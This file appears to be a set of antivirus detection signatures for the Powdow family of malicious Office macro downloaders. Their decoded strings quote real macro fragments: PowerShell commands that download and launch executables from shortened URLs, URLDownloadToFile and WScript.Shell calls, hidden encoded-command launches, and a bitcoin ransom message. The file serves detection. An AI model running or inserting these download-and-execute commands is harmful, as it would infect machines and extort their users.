
rule TrojanDownloader_O97M_Powdow_BK_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {28 6e 45 77 2d 6f 42 60 6a 65 63 54 } //01 00  (nEw-oB`jecT
		$a_01_1 = {2b 27 6c 6f 61 64 46 69 6c 65 27 29 } //01 00  +'loadFile')
		$a_01_2 = {74 74 70 73 3a 2f 2f 63 75 74 74 2e 6c 79 2f 38 6a 6d 44 50 56 62 } //01 00  ttps://cutt.ly/8jmDPVb
		$a_01_3 = {6d 6f 76 65 2d 49 74 65 6d 20 2d 50 61 74 68 } //00 00  move-Item -Path
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {28 6e 45 77 2d 6f 42 60 6a 65 63 54 } //01 00  (nEw-oB`jecT
		$a_01_1 = {27 2b 27 6c 6f 61 64 46 69 6c 65 27 29 } //01 00  '+'loadFile')
		$a_01_2 = {74 74 70 73 3a 2f 2f 63 75 74 74 2e 6c 79 2f 66 6a 59 74 79 64 48 } //01 00  ttps://cutt.ly/fjYtydH
		$a_01_3 = {6d 6c 6b 6a 6c 6a 6b 6a 6c 6b 72 67 6c 6b 6a 67 72 66 6a 6b 6c 6a 67 66 } //00 00  mlkjljkjlkrglkjgrfjkljgf
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 78 2c 20 22 62 62 6e 6e 65 64 65 74 63 79 22 2c 20 22 22 29 } //01 00  = Replace(x, "bbnnedetcy", "")
		$a_01_1 = {3d 20 41 63 74 69 76 65 43 65 6c 6c 2e 4f 66 66 73 65 74 28 69 43 2c 20 31 29 2e 56 61 6c 75 65 } //01 00  = ActiveCell.Offset(iC, 1).Value
		$a_01_2 = {43 61 6c 6c 20 79 47 47 73 76 61 42 2e 70 6b 75 74 64 46 5a } //00 00  Call yGGsvaB.pkutdFZ
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 20 28 4d 5f 53 20 2b 20 54 4f 47 41 43 44 54 20 2b 20 4d 5f 53 31 20 2b 20 4d 5f 53 32 20 2b 20 4d 5f 53 33 29 2c 20 30 } //01 00  Shell (M_S + TOGACDT + M_S1 + M_S2 + M_S3), 0
		$a_01_1 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 49 6d 61 67 65 6d 53 69 6d 70 6c 65 73 43 44 54 2c 20 4d 61 73 74 65 72 43 44 54 20 26 20 22 64 6f 63 75 6d 65 6e 74 2e 76 62 73 22 2c 20 30 2c 20 30 } //01 00  URLDownloadToFile 0, ImagemSimplesCDT, MasterCDT & "document.vbs", 0, 0
		$a_01_2 = {54 4f 47 41 43 44 54 20 3d 20 50 44 66 5f 32 20 2b 20 50 44 66 5f 33 } //00 00  TOGACDT = PDf_2 + PDf_3
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {68 7a 75 6e 4c 72 55 2e 52 75 6e 20 49 70 52 41 68 59 65 4a 20 2b 20 6e 59 4a 45 5a 4a 74 62 20 2b 20 79 4b 69 6a 6a 79 49 2c 20 52 56 61 6c 75 65 } //01 00  hzunLrU.Run IpRAhYeJ + nYJEZJtb + yKijjyI, RValue
		$a_01_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 43 6f 6d 6d 65 6e 74 73 22 29 } //01 00  = ActiveDocument.BuiltInDocumentProperties("Comments")
		$a_01_2 = {53 65 74 20 68 7a 75 6e 4c 72 55 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 73 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //00 00  Set hzunLrU = CreateObject("Wscript.Shell")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 20 28 22 43 3a 5c 5c 57 69 6e 64 6f 77 73 5c 5c 53 79 73 74 65 6d 33 32 5c 5c 63 6d 64 2e 65 78 65 20 2f 63 20 65 63 68 6f } //01 00  Shell ("C:\\Windows\\System32\\cmd.exe /c echo
		$a_01_1 = {28 77 67 65 74 20 27 68 74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 38 38 72 39 65 70 6b 27 20 2d 4f 75 74 46 69 6c 65 20 61 2e 65 78 65 29 20 3e 20 62 2e 70 73 31 } //01 00  (wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.ps1
		$a_01_2 = {70 6f 77 65 72 73 68 65 6c 6c 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 50 61 73 73 20 2d 46 69 6c 65 20 62 2e 70 73 31 } //01 00  powershell -ExecutionPolicy ByPass -File b.ps1
		$a_01_3 = {53 54 41 52 54 20 2f 4d 49 4e 20 61 2e 65 78 65 } //00 00  START /MIN a.exe
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {25 33 37 25 41 36 25 45 32 25 46 36 25 34 37 25 39 36 25 34 37 25 46 32 25 31 33 25 31 33 25 31 33 25 45 32 25 38 33 25 35 33 25 31 33 25 45 32 25 37 33 25 32 33 25 32 33 25 45 32 25 32 33 25 39 33 25 31 33 25 46 32 25 46 32 25 41 33 25 30 37 25 34 37 25 34 37 25 38 36 25 37 32 25 37 32 25 38 32 25 35 36 25 37 32 25 42 32 25 37 32 25 43 36 25 39 36 25 37 32 25 42 32 25 37 32 25 36 34 25 37 32 25 42 32 25 37 32 25 34 36 25 37 32 25 42 32 25 37 32 25 31 36 25 46 36 25 } //01 00  %37%A6%E2%F6%47%96%47%F2%13%13%13%E2%83%53%13%E2%73%23%23%E2%23%93%13%F2%F2%A3%07%47%47%86%72%72%82%56%72%B2%72%C6%96%72%B2%72%64%72%B2%72%46%72%B2%72%16%F6%
		$a_01_1 = {74 69 6c 70 53 2e 73 72 61 68 43 69 69 63 73 } //01 00  tilpS.srahCiics
		$a_01_2 = {24 20 6e 65 64 64 69 68 20 65 6c 79 74 53 77 6f } //01 00  $ neddih elytSwo
		$a_01_3 = {3d 73 72 61 68 43 69 69 63 73 61 } //00 00  =srahCiicsa
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 73 20 2d 4e 6f 50 72 6f 66 69 6c 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 68 69 64 64 65 6e } //01 00  powershell.exe  -ExecutionPolicy Bypass -NoProfile -WindowStyle hidden
		$a_01_1 = {45 6e 63 6f 64 65 64 63 6f 6d 6d 61 6e 64 20 63 41 42 76 41 48 63 41 5a 51 42 79 41 48 4d 41 61 41 42 6c 41 47 77 41 62 41 41 75 41 47 55 41 65 } //01 00  Encodedcommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAe
		$a_01_2 = {3d 20 4d 73 67 42 6f 78 28 22 57 45 20 48 41 56 45 20 41 4c 4c 20 59 4f 55 52 20 44 41 54 41 2d 20 59 4f 55 20 57 41 4e 54 20 50 41 59 3f 2d 30 2e 32 62 69 74 63 6f 69 6e 2d 37 38 66 63 57 4c 37 4d 38 41 37 77 6f 52 42 64 6e 50 75 72 65 7a 45 73 57 31 6f 36 33 52 56 59 55 53 22 2c 20 76 62 59 65 73 4e 6f 29 } //01 00  = MsgBox("WE HAVE ALL YOUR DATA- YOU WANT PAY?-0.2bitcoin-78fcWL7M8A7woRBdnPurezEsW1o63RVYUS", vbYesNo)
		$a_01_3 = {43 61 6c 6c 20 53 68 65 6c 6c } //00 00  Call Shell
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 68 74 74 70 73 3a 2f 2f 6c 6f 6e 67 2e 61 66 2f 46 61 63 74 44 6f 77 6e 50 61 72 74 79 22 } //01 00  = "https://long.af/FactDownParty"
		$a_03_1 = {3d 20 53 68 65 6c 6c 28 90 02 14 28 22 36 33 36 64 36 34 32 30 32 66 36 33 32 30 35 30 34 66 35 37 34 35 35 32 35 33 34 38 34 35 34 63 34 63 32 65 36 35 37 38 36 35 22 29 20 26 20 90 02 14 28 22 32 30 32 64 37 37 32 30 36 38 36 39 36 34 36 34 36 35 36 65 32 30 32 64 34 35 37 38 36 35 36 33 37 35 37 34 36 39 36 66 36 65 35 30 36 66 36 63 36 39 36 33 37 39 32 30 34 32 37 39 37 30 36 31 37 33 37 33 32 30 22 29 20 26 20 5f 90 00 } //01 00 
		$a_01_2 = {25 48 4f 4d 45 44 52 49 56 45 25 5c 25 48 4f 4d 45 50 41 54 48 25 5c 44 6f 63 75 6d 65 6e 74 73 5c 65 61 73 72 74 61 67 79 68 64 6a 6b 64 67 61 74 61 72 65 72 61 74 79 2e 70 73 31 22 22 22 2c 20 30 29 } //00 00  %HOMEDRIVE%\%HOMEPATH%\Documents\easrtagyhdjkdgatareraty.ps1""", 0)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_BK_MTB_10{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {73 74 72 43 6f 6d 62 69 6e 65 64 20 3d 20 73 74 72 31 20 26 20 73 74 72 32 20 26 20 73 74 72 33 20 26 20 73 74 72 34 20 26 20 73 74 72 35 20 26 20 73 74 72 36 20 26 20 73 74 72 37 } //01 00  strCombined = str1 & str2 & str3 & str4 & str5 & str6 & str7
		$a_01_1 = {73 74 72 43 6f 6d 6d 61 6e 64 20 3d 20 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 6e 6f 65 78 69 74 20 2d 65 6e 63 6f 64 65 64 63 6f 6d 6d 61 6e 64 20 22 20 26 20 73 74 72 43 6f 6d 62 69 6e 65 64 } //01 00  strCommand = "powershell.exe -noexit -encodedcommand " & strCombined
		$a_01_2 = {53 65 74 20 57 73 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //01 00  Set WsShell = CreateObject("WScript.Shell")
		$a_01_3 = {57 73 53 68 65 6c 6c 2e 52 75 6e 20 28 73 74 72 43 6f 6d 6d 61 6e 64 29 } //01 00  WsShell.Run (strCommand)
		$a_01_4 = {73 74 72 31 20 3d 20 22 4c 67 41 67 41 43 67 41 4b 41 42 6e 41 47 55 41 64 41 41 74 41 46 59 41 51 51 42 53 41 47 6b 41 51 51 42 43 41 } //00 00  str1 = "LgAgACgAKABnAGUAdAAtAFYAQQBSAGkAQQBCA
	condition:
		any of ($a_*)
 
}